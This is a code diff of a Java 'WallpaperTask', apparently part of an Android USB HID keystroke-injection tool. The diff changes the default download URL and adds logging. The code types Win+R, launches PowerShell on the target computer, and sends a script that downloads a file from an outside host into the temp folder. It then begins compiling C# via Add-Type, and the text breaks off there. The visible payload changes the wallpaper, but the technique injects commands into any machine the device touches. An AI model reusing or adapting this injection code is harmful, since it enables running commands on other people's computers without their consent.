@@ -22,7 +22,7 @@ public class WallpaperTask extends HIDTask {
 
         final HIDR h = this.getHIDR();
 
-        String file = ask("Wallpaper file?", "http://i.imgur.com/v53KZfh.jpg");
+        String file = ask("Wallpaper file?", "https://my.mixtape.moe/dgcnqv.png");
         while (!isCancelled()) {
             publishProgress(RunState.IDLE);
             // poll until /dev/hidg0 is writable
@@ -31,12 +31,17 @@ public class WallpaperTask extends HIDTask {
             }
             if (isCancelled()) break;
             publishProgress(RunState.RUNNING);
-
             h.delay(1000);
+
+            log("opening run dialog");
             h.press_keys(Input.KB.M.LSUPER.c, Input.KB.K.R.c);
+
             h.delay(2000);
+            log("running powershell");
             h.send_string("powershell\n");
+
             h.delay(2000);
+            log("sending payload");
             h.send_string("(new-object System.Net.WebClient).DownloadFile('" + file + "',\"$Env:Temp\\b.jpg\");\n" +
                     "Add-Type @\"\n" +
                     "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" +
